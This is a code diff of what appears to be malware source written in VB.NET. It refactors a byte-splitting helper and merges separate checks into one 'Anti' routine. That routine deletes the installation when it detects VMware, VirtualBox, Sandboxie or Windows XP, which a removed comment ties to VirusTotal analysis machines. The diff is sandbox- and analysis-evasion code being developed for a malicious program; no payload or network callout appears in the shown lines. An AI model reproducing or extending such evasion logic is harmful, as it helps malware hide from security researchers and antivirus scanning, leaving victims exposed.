@@ -36,13 +36,13 @@ Module Func
         End Try
     End Function
 
-    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
+    Function SplitWord(ByVal b As Byte(), ByVal Word As String) As Array ' split bytes by word
         Dim a As New Collections.Generic.List(Of Byte())
         Dim M As New IO.MemoryStream
         Dim MM As New IO.MemoryStream
-        Dim T As String() = Split(BS(b), WRD)
+        Dim T As String() = Split(BS(b), Word)
         M.Write(b, 0, T(0).Length)
-        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
+        MM.Write(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
         a.Add(M.ToArray)
         a.Add(MM.ToArray)
         M.Dispose()
@@ -50,29 +50,18 @@ Module Func
         Return a.ToArray
     End Function
 
-    Sub VMware()
+    Sub Anti()
         On Error Resume Next
         If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
             Installation.DEL()
-        End If
-    End Sub
 
-    Sub Virtualbox()
-        On Error Resume Next
-        If IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
+        ElseIf ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
             Installation.DEL()
-        End If
-    End Sub
 
-    Sub Sandboxie()
-        On Error Resume Next
-        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
+        ElseIf Process.GetProcessesByName("SbieSvc").Length >= 1 Then
             Installation.DEL()
-        End If
-    End Sub
 
-    Sub Win_XP() '90% of XP machines are virustotal PCs
-        If ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
+        ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
             Installation.DEL()
         End If
     End Sub
